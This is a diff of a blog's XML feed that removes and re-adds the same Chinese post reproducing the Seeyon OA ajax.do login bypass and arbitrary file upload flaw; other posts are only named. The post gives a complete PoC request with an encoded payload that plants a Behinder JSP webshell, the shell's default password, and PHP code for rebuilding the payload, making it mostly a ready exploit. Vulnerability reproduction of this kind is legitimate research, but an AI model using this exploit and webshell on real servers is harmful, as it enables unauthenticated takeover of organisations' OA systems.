-<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
-<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
-<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
-<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
-<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
-<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
-<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
-<p>成功的话会返回：</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
-<p>冰蝎连接：默认密码：rebeyond</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
-<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
-<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
-<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
-<p>最后进行了 url编码</p>
-<p>可以自定义：</p>
-<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
-<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
-<p>（然后关注了一下清水川崎师傅</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>seeyon OA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>s2-061漏洞复现及分析文档</title>
     <url>/2020/12/11/s2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/</url>
     <content><![CDATA[<h4 id="s2-061漏洞复现及分析文档"><a href="#s2-061漏洞复现及分析文档" class="headerlink" title="s2-061漏洞复现及分析文档"></a>s2-061漏洞复现及分析文档</h4><a id="more"></a>
@@ -1795,6 +1762,40 @@
 <p>2、换了个更好的公司</p>
 <p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210610145500746.png" alt="image-20210610145500746"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
+    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>参考：</p>
+<a id="more"></a>
+
+<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
+<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
+<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
+<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
+<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
+<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
+<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
+<p>成功的话会返回：</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
+<p>冰蝎连接：默认密码：rebeyond</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
+<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
+<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
+<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
+<p>最后进行了 url编码</p>
+<p>可以自定义：</p>
+<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
+<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
+<p>（然后关注了一下清水川崎师傅</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>seeyon OA</tag>
+      </tags>
   </entry>
   <entry>
     <title>加密与解密笔记--更新中</title>
